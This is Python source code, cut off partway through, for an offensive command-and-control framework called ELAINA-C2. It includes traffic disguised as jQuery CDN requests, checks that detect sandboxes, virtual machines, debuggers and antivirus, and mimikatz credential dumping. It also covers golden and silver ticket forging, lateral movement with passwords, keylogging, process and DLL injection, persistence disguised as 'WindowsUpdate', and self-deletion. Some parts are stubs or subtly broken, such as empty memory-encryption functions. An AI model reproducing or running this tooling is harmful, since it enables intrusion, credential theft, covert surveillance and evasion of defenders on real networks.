#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import warnings
import argparse
import urllib.parse
import socket
import ipaddress
import subprocess
import threading
import tempfile
import logging
import base64
import struct
import ssl
import hashlib
import zlib
import queue
import select
import re
import string
import ctypes
import platform
import getpass
import inspect
import ast
import types
import shutil
import glob
import pickle
import signal
import uuid
import io
import binascii
from datetime import datetime, timedelta
from functools import wraps, partial
from collections import defaultdict, deque
import requests
import cloudscraper
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import undetected_chromedriver as uc
from seleniumwire import webdriver as wire_webdriver
from selenium.webdriver.common.by import By
from stem.control import Controller
from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import KerberosError
from impacket.krb5.asn1 import AS_REQ, KRB_ERROR, AS_REP, TGS_REQ, TGS_REP, EncASRepPart, EncTGSRepPart
from impacket.krb5.types import Principal, KerberosTime, Ticket, AuthorizationData
from impacket.examples.ntlmrelayx.utils import Logger
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, LDAPRelayServer, WinRMRelayServer
from impacket.examples.ntlmrelayx.attacks import NTLMRelayxAttack
from impacket.examples.ntlmrelayx import ntlmrelayx
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetOptions
from impacket import version as impacket_version
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.constants import PreAuthenticationDataTypes, EncryptionTypes, TicketFlags
from impacket.structure import Structure
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.dcomrt import IRemoteShell
from impacket.smbconnection import SMBConnection
from impacket.ntlm import NTLMAuthNegotiate, NTLMAuthChallenge, NTLMAuthAuthenticate
from impacket.crypto import transformKey, encrypt_RC4, decrypt_RC4
import certipy.lib.certipy_logger as certipy_logger
import certipy.lib.certipy_client as certipy_client
import certipy.lib.certipy_utils as certipy_utils
import ntlmrelayx.attacks
from cryptography.hazmat.primitives.serialization import pkcs12, Encoding, PrivateFormat, NoEncryption
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                            QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView, 
                            QPushButton, QGroupBox, QTextEdit, QLabel, QSplitter, 
                            QFileDialog, QMessageBox, QAction, QMenu, QMenuBar, 
                            QDialog, QLineEdit, QFormLayout, QDialogButtonBox, QCompleter,
                            QScrollArea, QFrame, QStatusBar, QSystemTrayIcon, QStyle,
                            QToolBar, QComboBox, QSpinBox, QCheckBox, QRadioButton,
                            QButtonGroup, QListWidget, QListWidgetItem, QProgressBar,
                            QInputDialog, QAbstractItemView, QTreeWidget, QTreeWidgetItem,
                            QGraphicsView, QGraphicsScene, QGraphicsItem, QGraphicsEllipseItem,
                            QGraphicsLineItem, QGraphicsTextItem, QGridLayout, QSizePolicy,
                            QStackedWidget, QDockWidget, QMdiArea, QMdiSubWindow, QTextBrowser,
                            QToolButton, QSizePolicy, QSpacerItem, QSplitterHandle)
from PyQt5.QtCore import Qt, pyqtSignal, QTimer, QThread, QSize, QUrl, QMimeData, QBuffer, QIODevice, QPoint, QRect, QPointF, QSettings, QDataStream
from PyQt5.QtGui import QIcon, QFont, QPixmap, QImage, QTextCharFormat, QColor, QClipboard, QDrag, QDesktopServices, QPainter, QPen, QBrush, QTextCursor, QKeySequence, QTextDocument
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtWebChannel import QWebChannel
from PyQt5.QtWebSockets import QWebSocketServer, QWebSocket

warnings.filterwarnings("ignore", message="Unverified HTTPS request")
init(autoreset=True)

LOG_JSON_PATH = "elaina_ultimate_log.json"
COOKIE_PATH = "elaina_ultimate_cookies.txt"
LOG_JSON_FILE = "adcs_exploit_log.json"
CCACHE_PATH = "golden_ticket.ccache"
C2_CONFIG_PATH = "c2_config.json"
BEACON_CONFIG_PATH = "beacon_config.bin"
BOF_DIR = "bof"
SCRIPT_DIR = "scripts"
PROFILE_DIR = "profiles"

logger = logging.getLogger("ELAINA-C2")
logger.setLevel(logging.DEBUG)
console_handler = logging.StreamHandler()
console_format = logging.Formatter("\033[1;32m%(asctime)s\033[0m [\033[1;34m%(levelname)s\033[0m] \033[1;33m%(module)s\033[0m: %(message)s", datefmt="%H:%M:%S")
console_handler.setFormatter(console_format)
logger.addHandler(console_handler)
log_entries = []

def log(action, target, status, detail=None):
    entry = {
        "action": action,
        "target": target,
        "status": status,
        "detail": detail or "",
        "time": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    log_entries.append(entry)
    with open(LOG_JSON_PATH, "w") as f:
        json.dump(log_entries, f, indent=2)
    logger.info(f"{action} {target} {status} {detail or ''}")

def retry(ExceptionToCheck, tries=3, delay=2, backoff=2):
    def deco_retry(f):
        @wraps(f)
        def f_retry(*args, **kwargs):
            mtries, mdelay = tries, delay
            while mtries > 1:
                try:
                    return f(*args, **kwargs)
                except ExceptionToCheck as e:
                    logger.warning(f"Retry {f.__name__} due to: {str(e)}. Waiting {mdelay}s")
                    time.sleep(mdelay)
                    mtries -= 1
                    mdelay *= backoff
            return f(*args, **kwargs)
        return f_retry
    return deco_retry

def random_sleep(min_s=0.5, max_s=2):
    time.sleep(random.uniform(min_s, max_s))

def colorize(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"

def random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

class AdvancedEncryption:
    def __init__(self):
        self.algorithm = algorithms.AES(256)
        self.mode = modes.GCM(96)
        self.key_size = 32
        
    def generate_key(self, password, salt):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.key_size,
            salt=salt,
            iterations=100000,
        )
        return kdf.derive(password.encode())
    
    def encrypt(self, data, key):
        iv = os.urandom(12)
        cipher = Cipher(self.algorithm, self.mode, backend=default_backend())
        encryptor = cipher.encryptor(key)
        
        encryptor.authenticate_additional_data(b"additional_data")
        ciphertext = encryptor.update(data) + encryptor.finalize()
        
        return iv + ciphertext + encryptor.tag
    
    def decrypt(self, encrypted_data, key):
        iv = encrypted_data[:12]
        tag = encrypted_data[-16:]
        ciphertext = encrypted_data[12:-16]
        
        cipher = Cipher(self.algorithm, self.mode, backend=default_backend())
        decryptor = cipher.decryptor(key, iv)
        
        decryptor.authenticate_additional_data(b"additional_data")
        return decryptor.update(ciphertext) + decryptor.finalize_with_tag(tag)

class AdvancedDomainGenerator:
    def __init__(self):
        self.legitimate_domains = [
            "google.com", "microsoft.com", "amazon.com", "cloudflare.com",
            "github.com", "stackoverflow.com", "wikipedia.org", "youtube.com"
        ]
        
    def generate_domain(self):
        base_domain = random.choice(self.legitimate_domains)
        subdomain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
        tld = random.choice(['com', 'org', 'net', 'io', 'co', 'ai'])
        return f"{subdomain}.{base_domain}.{tld}"
    
    def generate_url_list(self, count=10):
        urls = []
        for _ in range(count):
            domain = self.generate_domain()
            path = '/'.join(random.choices(['api', 'v1', 'v2', 'cdn', 'static', 'assets'], k=random.randint(1, 3)))
            urls.append(f"https://{domain}/{path}")
        return urls

class TrafficShaper:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ]
        
    def shape_request(self, data):
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
        
        time.sleep(random.uniform(0.1, 0.5))
        return headers, data
    
    def jitter_sleep(self, base_sleep, jitter_percent=0.3):
        jitter = random.uniform(0, jitter_percent)
        sleep_time = base_sleep * (1 + jitter)
        time.sleep(sleep_time)

class MalleableC2Profile:
    def __init__(self, profile_path=None):
        self.profile = {
            "http-get": {
                "uri": "/jquery.min.js",
                "client": {
                    "headers": {
                        "Accept": "*/*",
                        "Host": "cdn.jquery.com"
                    }
                },
                "server": {
                    "output": {
                        "type": "base64"
                    }
                }
            },
            "http-post": {
                "uri": "/submit.php",
                "client": {
                    "headers": {
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    "data": "data="
                },
                "server": {
                    "output": {
                        "type": "base64"
                    }
                }
            },
            "http-stager": {
                "uri": "/jquery-3.3.2.min.js",
                "client": {
                    "headers": {
                        "Accept": "*/*",
                        "Host": "cdn.jquery.com"
                    }
                }
            },
            "process-inject": {
                "transform-x64": "x86\\shikata_ga_nai",
                "transform-x86": "x86\\shikata_ga_nai",
                "execute": {
                    "method": "CreateThread"
                }
            },
            "stage": {
                "checksum": "true",
                "sleep": "5000"
            }
        }
        
        if profile_path and os.path.exists(profile_path):
            with open(profile_path, 'r') as f:
                custom_profile = json.load(f)
                self.profile.update(custom_profile)
    
    def get_http_get_config(self):
        return self.profile.get("http-get", {})
    
    def get_http_post_config(self):
        return self.profile.get("http-post", {})
    
    def get_http_stager_config(self):
        return self.profile.get("http-stager", {})
    
    def get_process_inject_config(self):
        return self.profile.get("process-inject", {})
    
    def get_stage_config(self):
        return self.profile.get("stage", {})

class SleepObfuscation:
    def __init__(self, method="thread_stack"):
        self.method = method
        
    def obfuscate_sleep(self, sleep_time):
        if self.method == "thread_stack":
            self._thread_stack_obfuscation(sleep_time)
        elif self.method == "memory_encryption":
            self._memory_encryption_obfuscation(sleep_time)
        elif self.method == "api_call_obfuscation":
            self._api_call_obfuscation(sleep_time)
        else:
            time.sleep(sleep_time)
    
    def _thread_stack_obfuscation(self, sleep_time):
        end_time = time.time() + sleep_time
        while time.time() < end_time:
            remaining = end_time - time.time()
            if remaining <= 0:
                break
                
            chunk_size = min(remaining, random.uniform(0.1, 0.5))
            time.sleep(chunk_size)
            
            if random.random() < 0.3:
                self._random_api_call()
    
    def _memory_encryption_obfuscation(self, sleep_time):
        end_time = time.time() + sleep_time
        while time.time() < end_time:
            remaining = end_time - time.time()
            if remaining <= 0:
                break
                
            chunk_size = min(remaining, random.uniform(0.1, 0.5))
            
            if random.random() < 0.5:
                self._encrypt_memory_region()
                
            time.sleep(chunk_size)
            
            if random.random() < 0.3:
                self._decrypt_memory_region()
    
    def _api_call_obfuscation(self, sleep_time):
        end_time = time.time() + sleep_time
        while time.time() < end_time:
            remaining = end_time - time.time()
            if remaining <= 0:
                break
                
            chunk_size = min(remaining, random.uniform(0.1, 0.5))
            time.sleep(chunk_size)
            
            self._random_api_call()
    
    def _random_api_call(self):
        if platform.system() == "Windows":
            calls = [
                lambda: ctypes.windll.kernel32.GetTickCount(),
                lambda: ctypes.windll.kernel32.QueryPerformanceCounter(ctypes.byref(ctypes.c_ulonglong())),
                lambda: ctypes.windll.kernel32.GetSystemTime(ctypes.byref(ctypes.wintypes.SYSTEMTIME())),
                lambda: ctypes.windll.user32.GetCursorPos(ctypes.byref(ctypes.wintypes.POINT()))
            ]
            
            random.choice(calls)()
    
    def _encrypt_memory_region(self):
        pass
    
    def _decrypt_memory_region(self):
        pass

class OPSECManager:
    def __init__(self, beacon):
        self.beacon = beacon
        self.sandbox_indicators = [
            "sample", "malware", "analysis", "sandbox", "cuckoo", "joe", 
            "vmware", "virtualbox", "qemu", "xen", "virtual", "hyper-v"
        ]
        self.vm_indicators = [
            "vmware", "virtualbox", "qemu", "xen", "virtual", "hyper-v"
        ]
        self.debugger_indicators = [
            "ollydbg", "ida", "windbg", "immunity", "x64dbg", "cheat engine"
        ]
        
    def environment_check(self):
        checks = {
            "vm_detection": self.detect_vm(),
            "sandbox_detection": self.detect_sandbox(),
            "debugger_detection": self.detect_debugger(),
            "av_detection": self.detect_av()
        }
        
        return checks
    
    def detect_vm(self):
        try:
            result = self.beacon.execute_task({
                "type": "shell",
                "data": "wmic computersystem get model"
            })
            
            model = result.get("stdout", "").lower()
            for indicator in self.vm_indicators:
                if indicator in model:
                    return True
                    
            result = self.beacon.execute_task({
                "type": "shell",
                "data": "wmic bios get serialnumber"
            })
            
            serial = result.get("stdout", "").lower()
            for indicator in self.vm_indicators:
                if indicator in serial:
                    return True
                    
            result = self.beacon.execute_task({
                "type": "shell",
                "data": "wmic diskdrive get model"
            })
            
            disk_model = result.get("stdout", "").lower()
            for indicator in self.vm_indicators:
                if indicator in disk_model:
                    return True
        except:
            pass
            
        return False
    
    def detect_sandbox(self):
        try:
            result = self.beacon.execute_task({
                "type": "shell",
                "data": "hostname"
            })
            
            hostname = result.get("stdout", "").lower()
            for indicator in self.sandbox_indicators:
                if indicator in hostname:
                    return True
                    
            result = self.beacon.execute_task({
                "type": "shell",
                "data": "systeminfo | findstr /B /C:\"System Model\""
            })
            
            model = result.get("stdout", "").lower()
            for indicator in self.sandbox_indicators:
                if indicator in model:
                    return True
                    
            result = self.beacon.execute_task({
                "type": "shell",
                "data": "tasklist /svc"
            })
            
            processes = result.get("stdout", "").lower()
            for indicator in self.sandbox_indicators:
                if indicator in processes:
                    return True
        except:
            pass
            
        return False
    
    def detect_debugger(self):
        try:
            if platform.system() == "Windows":
                result = self.beacon.execute_task({
                    "type": "shell",
                    "data": "tasklist /m"
                })
                
                modules = result.get("stdout", "").lower()
                for indicator in self.debugger_indicators:
                    if indicator in modules:
                        return True
        except:
            pass
            
        return False
    
    def detect_av(self):
        try:
            if platform.system() == "Windows":
                result = self.beacon.execute_task({
                    "type": "shell",
                    "data": "sc query type= service state= all | findstr /i \"antivirus\""
                })
                
                av_services = result.get("stdout", "")
                if "antivirus" in av_services.lower():
                    return True
                    
                result = self.beacon.execute_task({
                    "type": "shell",
                    "data": "tasklist /svc | findstr /i \"av\""
                })
                
                av_processes = result.get("stdout", "")
                if "av" in av_processes.lower():
                    return True
        except:
            pass
            
        return False
    
    def self_destruct(self, reason):
        try:
            self.beacon.execute_task({
                "type": "shell",
                "data": f"echo 'Self-destructing: {reason}' && del $env:temp\\beacon.exe"
            })
            
            self.beacon.execute_task({
                "type": "shell",
                "data": "schtasks /delete /tn \"WindowsUpdate\" /f"
            })
            
            self.beacon.execute_task({
                "type": "shell",
                "data": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f"
            })
        except:
            pass
            
        sys.exit(0)

class BOFManager:
    def __init__(self, beacon):
        self.beacon = beacon
        self.loaded_bofs = {}
        
        if not os.path.exists(BOF_DIR):
            os.makedirs(BOF_DIR)
    
    def load_bof(self, bof_path):
        if not os.path.exists(bof_path):
            return False
            
        try:
            with open(bof_path, 'rb') as f:
                bof_data = f.read()
            
            bof_name = os.path.basename(bof_path)
            self.loaded_bofs[bof_name] = bof_data
            
            return True
        except:
            return False
    
    def load_all_bofs(self):
        for bof_file in glob.glob(os.path.join(BOF_DIR, "*.o")):
            self.load_bof(bof_file)
    
    def execute_bof(self, bof_name, args=None):
        if bof_name not in self.loaded_bofs:
            return {"status": "error", "message": f"BOF {bof_name} not loaded"}
            
        try:
            bof_data = self.loaded_bofs[bof_name]
            encoded_bof = base64.b64encode(bof_data).decode('utf-8')
            
            task_data = {
                "bof_data": encoded_bof,
                "entry_point": "go"
            }
            
            if args:
                task_data["args"] = args
                
            return self.beacon.execute_task({
                "type": "bof",
                "data": task_data
            })
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def list_loaded_bofs(self):
        return list(self.loaded_bofs.keys())
    
    def reflective_dll_injection(self, dll_path):
        if not os.path.exists(dll_path):
            return {"status": "error", "message": f"DLL {dll_path} not found"}
            
        try:
            with open(dll_path, 'rb') as f:
                dll_data = f.read()
                
            encoded_dll = base64.b64encode(dll_data).decode('utf-8')
            
            return self.beacon.execute_task({
                "type": "reflective_dll",
                "data": {
                    "dll_data": encoded_dll,
                    "function": "Execute"
                }
            })
        except Exception as e:
            return {"status": "error", "message": str(e)}

class PostExploitationModule:
    def __init__(self, beacon):
        self.beacon = beacon
        self.bof_manager = BOFManager(beacon)
        self.bof_manager.load_all_bofs()
        
    def execute_mimikatz(self, command="sekurlsa::logonpasswords"):
        mimikatz_args = {
            "command": command
        }
        
        return self.beacon.execute_task({
            "type": "mimikatz",
            "data": mimikatz_args
        })
    
    def lsass_dump(self):
        return self.execute_mimikatz("lsadump::sam")
    
    def get_system_privs(self):
        return self.execute_mimikatz("privilege::debug")
    
    def golden_ticket(self, domain, user, sid, krbtgt_hash, lifetime=10):
        args = {
            "domain": domain,
            "user": user,
            "sid": sid,
            "krbtgt_hash": krbtgt_hash,
            "lifetime": lifetime
        }
        
        return self.beacon.execute_task({
            "type": "golden_ticket",
            "data": args
        })
    
    def silver_ticket(self, domain, user, sid, service, service_hash, lifetime=10):
        args = {
            "domain": domain,
            "user": user,
            "sid": sid,
            "service": service,
            "service_hash": service_hash,
            "lifetime": lifetime
        }
        
        return self.beacon.execute_task({
            "type": "silver_ticket",
            "data": args
        })
    
    def lateral_movement_psexec(self, target, username, password, command):
        psexec_command = f"psexec \\\\{target} -u {username} -p {password} {command}"
        
        return self.beacon.execute_task({
            "type": "shell",
            "data": psexec_command
        })
    
    def lateral_movement_wmi(self, target, username, password, command):
        wmi_command = f"wmic /node:\"{target}\" /user:\"{username}\" /password:\"{password}\" process call create \"{command}\""
        
        return self.beacon.execute_task({
            "type": "shell",
            "data": wmi_command
        })
    
    def lateral_movement_smb(self, target, username, password, command):
        smb_command = f"smbclient //{target}/IPC$ -U {username}%{password} -c \"{command}\""
        
        return self.beacon.execute_task({
            "type": "shell",
            "data": smb_command
        })
    
    def lateral_movement_winrm(self, target, username, password, command):
        winrm_command = f"winrs -r:{target} -u:{username} -p:{password} {command}"
        
        return self.beacon.execute_task({
            "type": "shell",
            "data": winrm_command
        })
    
    def privilege_escalation(self):
        return self.beacon.execute_task({
            "type": "shell",
            "data": "powershell -c \"Invoke-AllChecks\""
        })
    
    def port_scan(self, target, ports="1-1000"):
        scan_command = f"powershell -c \"Invoke-Portscan -Hosts {target} -Ports {ports}\""
        
        return self.beacon.execute_task({
            "type": "shell",
            "data": scan_command
        })
    
    def ad_enumeration(self):
        ad_command = "powershell -c \"Invoke-ADRecon -ReportFolder .\""
        
        return self.beacon.execute_task({
            "type": "shell",
            "data": ad_command
        })
    
    def keylogger_start(self):
        return self.beacon.execute_task({
            "type": "keylogger",
            "data": {"action": "start"}
        })
    
    def keylogger_stop(self):
        return self.beacon.execute_task({
            "type": "keylogger",
            "data": {"action": "stop"}
        })
    
    def keylogger_dump(self):
        return self.beacon.execute_task({
            "type": "keylogger",
            "data": {"action": "dump"}
        })
    
    def screenshot(self):
        return self.beacon.execute_task({
            "type": "screenshot",
            "data": {}
        })
    
    def process_inject(self, pid, shellcode):
        args = {
            "pid": pid,
            "shellcode": base64.b64encode(shellcode).decode('utf-8')
        }
        
        return self.beacon.execute_task({
            "type": "process_inject",
            "data": args
        })
    
    def dll_inject(self, pid, dll_path):
        args = {
            "pid": pid,
            "dll_path": dll_path
        }
        
        return self.beacon.execute_task({
            "type": "dll_inject",
            "data": args
        })
    
    def persistence_registry(self, key, value, data):
        reg_command = f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {key} /t REG_SZ /d \"{data}\" /f"
        
        return self.beacon.execute_task({
            "type": "shell",
            "data": reg_command
        })
    
    def persistence_service(self, name, bin_path):
        service_command = f"sc create {name} binPath= \"{bin_path}\" start= auto DisplayName= \"Windows Update\""
        
        return self.beacon.execute_task({
            "type": "shell",
            "data": service_command
        })
    
    def persistence_scheduled_task(self, name, command, trigger="daily"):
        task_command = f"schtasks /create /tn {name} /tr \"{command}\" /sc {trigger} /ru System"
        
        return self.beacon.execute_task({
            "type": "shell",
            "data": task_command
        })
    
    def persistence_wmi_event(self, name, command):
        wmi_command = f"powershell -c \"$FilterArgs = @{{Name='{name}'; EventName='Win32_ProcessStartTrace'; Command='{command}'}}; $Filter = New-WmiEventFilter -Namespace root\\subscription -QueryParameters $FilterArgs -Query \"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'\" -EventName $FilterArgs.EventName; $Consumer = New-WmiEventConsumer -CommandLineConsumer -CommandLineTemplate $FilterArgs.Command; $Binding = New-WmiEventFilterToConsumerBinding -Filter $Filter -Consumer $Consumer\""
        
        return self.beacon.execute_task({
            "type": "shell",
            "data": wmi_command
        })

class ElainaScriptEngine:
    def __init__(self, main_window):
        self.main_window = main_window
        self.functions = {
            "beacon_execute": self.beacon_execute,
            "sleep": self.sleep,
            "bprint": self.bprint,
            "bdialog": self.bdialog,
            "beacon_ids": self.beacon_ids,
            "beacon_info": self.beacon_info,
            "beacon_select": self.beacon_select,
            "beacon_remove": self.beacon_remove,
            "c2_start": self.c2_start,
            "c2_stop": self.c2_stop,
            "listener_add": self.listener_add,
            "listener_remove": self.listener_remove,
            "script_load": self.script_load,
            "script_execute": self.script_execute,
            "screenshot": self.screenshot,
            "keylogger_start": self.keylogger_start,
            "keylogger_stop": self.keylogger_stop,
            "keylogger_dump": self.keylogger_dump,
            "mimikatz": self.mimikatz,
            "golden_ticket": self.golden_ticket,
            "silver_ticket": self.silver_ticket,
            "lateral_movement": self.lateral_movement,
            "privilege_escalation": self.privilege_escalation,
            "port_scan": self.port_scan,
            "ad_enumeration": self.ad_enumeration,
            "persistence": self.persistence,
            "process_inject": self.process_inject,
            "dll_inject": self.dll_inject,
            "bof_load": self.bof_load,
            "bof_execute": self.bof_execute,
            "self_destruct": self.self_destruct
        }
        
        self.loaded_scripts = {}
        
        if not os.path.exists(SCRIPT_DIR):
            os.makedirs(SCRIPT_DIR)
    
    def execute_script(self, script_content, script_name="inline"):
        try:
            script_globals = {"__name__": "__main__"}
            script_globals.update(self.functions)
            
            exec(script_content, script_globals)
            
            return True
        except Exception as e:
            self.bprint(f"Script execution error: {e}")
            return False
    
    def load_script(self, script_path):
        if not os.path.exists(script_path):
            return False
            
        try:
            with open(script_path, 'r') as f:
                script_content = f.read()
            
            script_name = os.path.basename(script_path)
            self.loaded_scripts[script_name] = script_content
            
            return True
        except Exception as e:
            self.bprint(f"Script load error: {e}")
            return False
    
    def load_all_scripts(self):
        for script_file in glob.glob(os.path.join(SCRIPT_DIR, "*.elaina")):
            self.load_script(script_file)
    
    def beacon_execute(self, beacon_id, command):
        if beacon_id in self.main_window.beacons:
            return self.main_window.send_beacon_command(beacon_id, command)
        return False
    
    def sleep(self, seconds):
        time.sleep(seconds)
    
    def bprint(self, message):
        self.main_window.add_log_entry(message)
    
    def bdialog(self, title, message):
        dialog = QMessageBox()
        dialog.setWindowTitle(title)
        dialog.setText(message)
        dialog.exec_()
    
    def beacon_ids(self):
        return list(self.main_window.beacons.keys())
    
    def beacon_info(self, beacon_id):
        if beacon_id in self.main_window.beacons:
            return self.main_window.beacons[beacon_id]
        return {}
    
    def beacon_select(self, beacon_id):
        if beacon_id in self.main_window.beacons:
            self.main_window.select_beacon(beacon_id)
            return True
        return False
    
    def beacon_remove(self, beacon_id):
        if beacon_id in self.main_window.beacons:
            self.main_window.remove_beacon_by_id(beacon_id)
            return True
        return False
    
    def c2_start(self, host, port, ssl=False):
        self.main_window.c2_host_input.setText(host)
        self.main_window.c2_port_input.setValue(port)
        self.main_window.c2_ssl_checkbox.setChecked(ssl)
        self.main_window.start_c2_server()
        return True
    
    def c2_stop(self):
        self.main_window.stop_c2_server()
        return True
    
    def listener_add(self, name, listener_type, host, port, ssl=False):
        self.main_window.listener_name_input.setText(name)
        self.main_window.listener_type_combo.setCurrentText(listener_type)
        self.main_window.listener_host_input.setText(host)
        self.main_window.listener_port_input.setValue(port)
        self.main_window.listener_ssl_checkbox.setChecked(ssl)
        self.main_window.add_listener()
        return True
    
    def listener_remove(self, name):
        return self.main_window.remove_listener_by_name(name)
    
    def script_load(self, script_path):
        return self.load_script(script_path)
    
    def script_execute(self, script_name):
        if script_name in self.loaded_scripts:
            return self.execute_script(self.loaded_scripts[script_name], script_name)
        return False
    
    def screenshot(self, beacon_id):
        if beacon_id in self.main_window.beacons:
            self.main_window.send_beacon_command(beacon_id, "screenshot")
            return True
        return False
    
    def keylogger_start(self, beacon_id):
        if beacon_id in self.main_window.beacons:
            self.main_window.send_beacon_command(beacon_id, "keylogger_start")
            return True
        return False
    
    def keylogger_stop(self, beacon_id):
        if beacon_id in self.main_window.beacons:
            self.main_window.send_beacon_command(beacon_id, "keylogger_stop")
            return True
        return False
    
    def keylogger_dump(self, beacon_id):
        if beacon_id in self.main_window.beacons:
            self.main_window.send_beacon_command(beacon_id, "keylogger_dump")
            return True
        return False
    
    def mimikatz(self, beacon_id, command="sekurlsa::logonpasswords"):
        if beacon_id in self.main_window.beacons:
            self.main_window.send_beacon_command(beacon_id, f"mimikatz {command}")
            return True
        return False
    
    def golden_ticket(self, beacon_id, domain, user, sid, krbtgt_hash, lifetime=10):
        if beacon_id in self.main_window.beacons:
            cmd = f"golden_ticket {domain} {user} {sid} {krbtgt_hash} {lifetime}"
            self.main_window.send_beacon_command(beacon_id, cmd)
            return True
        return False
    
    def silver_ticket(self, beacon_id, domain, user, sid, service, service_hash, lifetime=10):
        if beacon_id in self.main_window.beacons:
            cmd = f"silver_ticket {domain} {user} {sid} {service} {service_hash} {lifetime}"
            self.main_window.send_beacon_command(beacon_id, cmd)
            return True
        return False
    
    def lateral_movement(self, beacon_id, target, username, password, method="psexec", command="whoami"):
        if beacon_id in self.main_window.beacons:
            cmd = f"lateral_movement {method} {target} {username} {password} {command}"
            self.main_window.send_beacon_command(beacon_id, cmd)
            return True
        return False
    
    def privilege_escalation(self, beacon_id):
        if beacon_id in self.main_window.beacons:
            self.main_window.send_beacon_command(beacon_id, "privilege_escalation")
            return True
        return False
    
    def port_scan(self, beacon_id, target, ports="1-1000"):
        if beacon_id in self.main_window.beacons:
            self.main_window.send_beacon_command(beacon_id, f"port_scan {target} {ports}")
            return True
        return False
    
    def ad_enumeration(self, beacon_id):
        if beacon_id in self.main_window.beacons:
            self.main_window.send_beacon_command(beacon_id, "ad_enumeration")
            return True
        return False
    
    def persistence(self, beacon_id, method, name, data):
        if beacon_id in self.main_window.beacons:
            cmd = f"persistence {method} {name} {data}"
            self.main_window.send_beacon_command(beacon_id, cmd)
            return True
        return False
    
    def process_inject(self, beacon_id, pid, shellcode_path):
        if beacon_id in self.main_window.beacons:
            with open(shellcode_path, 'rb') as f:
                shellcode = base64.b64encode(f.read()).decode('utf-8')
            cmd = f"process_inject {pid} {shellcode}"
            self.main_window.send_beacon_command(beacon_id, cmd)
            return True
        return False
    
    def dll_inject(self, beacon_id, pid, dll_path):
        if beacon_id in self.main_window.beacons:
            cmd = f"dll_inject {pid} {dll_path}"
            self.main_window.send_beacon_command(beacon_id, cmd)
            return True
        return False
    
    def bof_load(self, bof_path):
        if hasattr(self.main_window, 'bof_manager'):
            return self.main_window.bof_manager.load_bof(bof_path)
        return False
    
    def bof_execute(self, beacon_id, bof_name, args=""):
        if beacon_id in self.main_window.beacons and hasattr(self.main_window, 'bof_manager'):
            return self.main_window.bof_manager.execute_bof(bof_name, args)
        return False
    
    def self_destruct(self, beacon_id, reason="OPSEC check failed"):
        if beacon_id in self.main_window.beacons:
            self.main_window.send_beacon_command(beacon_id, f"self_destruct {reason}")
            return True
        return False

class TeamServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}
        self.chat_history = []
        self.shared_beacons = {}
        self.shared_tasks = {}
        self.server_socket = None
        self.running = False
        
    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            
            listener_thread = threading.Thread(target=self._listen_for_clients)
            listener_thread.daemon = True
            listener_thread.start()
            
            return True
        except Exception as e:
            logger.error(f"Failed to start Team Server: {str(e)}")
            return False
    
    def stop(self):
        self.running = False
        
        if self.server_socket:
            self.server_socket.close()
            
        for client_id, client_info in self.clients.items():
            try:
                client_info["socket"].close()
            except:
                pass
                
        self.clients.clear()
    
    def _listen_for_clients(self):
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                client_id = f"{client_address[0]}:{client_address[1]}:{int(time.time())}"
                
                logger.info(f"New Team Server connection from {client_address} assigned ID {client_id}")
                
                self.clients[client_id] = {
                    "socket": client_socket,
                    "address": client_address,
                    "username": f"Operator_{random.randint(1000, 9999)}",
                    "privileges": "user",
                    "last_active": time.time()
                }
                
                client_thread = threading.Thread(target=self._handle_client, args=(client_id,))
                client_thread.daemon = True
                client_thread.start()
                
                self._send_client_list()
            except Exception as e:
                logger.error(f"Error accepting Team Server client connection: {str(e)}")
    
    def _handle_client(self, client_id):
        client = self.clients.get(client_id)
        if not client:
            return
            
        socket = client["socket"]
        socket.settimeout(60)
        
        try:
            while self.running:
                try:
                    ready = select.select([socket], [], [], 1)
                    if ready[0]:
                        data = socket.recv(4096)
                        if not data:
                            break
                            
                        message = self._parse_client_message(client_id, data)
                        if message:
                            self._process_client_message(client_id, message)
                    
